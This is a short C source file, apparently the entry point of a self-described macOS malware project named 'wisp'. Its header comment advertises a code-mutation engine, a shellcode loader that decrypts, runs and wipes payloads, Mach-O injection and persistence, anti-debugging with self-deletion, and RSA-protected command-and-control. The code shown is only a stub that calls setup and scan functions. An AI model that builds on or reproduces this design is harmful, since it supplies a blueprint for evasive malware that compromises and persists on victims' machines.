/*
 * F00's wisp - manual x86/arm64 decoder, mut8r, and Mach-O mangler
 *
 * - No unicorn, just raw decode_x86/arm64, all hand-rolled (Buggy as fuck)
 * - Mut8r: shuffles, swaps, and mangles code, keeps it runnin'
 * - CFG hacks: block reorder, flatten, dead/junk, reg liveness, all that
 * - Shellcode loader: decrypts, mut8s, runs, wipes after
 * - Mach-O: injects, trashes, persists, self-relocates if needed
 * - Anti: sysctl, path checks, kills on debug, wipes self if poked
 * - Crypto: ChaCha20 for rng, AES for payload, RSA for C2, zlib for squish
 * - Vault: strings/paths all locked up, need Keys.
 *
 * run() kicks it off, initialize() does the setup, mutate() does the dirt
 * try ./RunMe.sh
 */
#include <wisp.h>

void run() {
    if (scan()) panic();
}

int main(void) {
    set_crash();
    #ifndef TEST
    initialize__strings();
    #endif
    initialize();
    return 0;
}
